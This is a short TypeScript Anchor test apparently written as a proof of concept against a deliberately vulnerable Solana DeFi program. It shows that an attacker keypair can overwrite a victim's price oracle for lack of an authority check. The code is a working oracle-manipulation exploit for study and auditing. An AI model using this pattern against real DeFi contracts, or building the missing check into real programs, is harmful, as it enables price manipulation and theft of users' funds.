import * as anchor from "@coral-xyz/anchor";
import { Program } from "@coral-xyz/anchor";
import { VulnerableDefiProtocol } from "../target/types/vulnerable_defi_protocol";
import { assert } from "chai";

// POC #7: Unauthorized Oracle Update

describe("POC #7 - Unauthorized Oracle Update", () => {
  const provider = anchor.AnchorProvider.env();
  anchor.setProvider(provider);
  const program = anchor.workspace.VulnerableDefiProtocol as Program<VulnerableDefiProtocol>;

  let admin: anchor.web3.Keypair;
  let attacker: anchor.web3.Keypair;
  let victim: anchor.web3.Keypair;

  before(async () => {
    admin = anchor.web3.Keypair.generate();
    attacker = anchor.web3.Keypair.generate();
    victim = anchor.web3.Keypair.generate();
    const airdropAmount = 10 * anchor.web3.LAMPORTS_PER_SOL;
    for (const kp of [admin, attacker, victim]) {
      await provider.connection.confirmTransaction(
        await provider.connection.requestAirdrop(kp.publicKey, airdropAmount)
      );
    }
  });

  it("Any signer can update any oracle", async () => {
    const victimOracle = anchor.web3.Keypair.generate();

    await program.methods
      .createOracle(new anchor.BN(100))
      .accounts({ oracle: victimOracle.publicKey, signer: victim.publicKey, systemProgram: anchor.web3.SystemProgram.programId } as any)
      .signers([victim, victimOracle])
      .rpc();

    await program.methods
      .updateOracle(new anchor.BN(999_999_999))
      .accounts({ oracle: victimOracle.publicKey, authority: attacker.publicKey } as any)
      .signers([attacker])
      .rpc();

    const oracleData = await program.account.oracle.fetch(victimOracle.publicKey);
    assert.equal(oracleData.price.toString(), "999999999");
  });
});
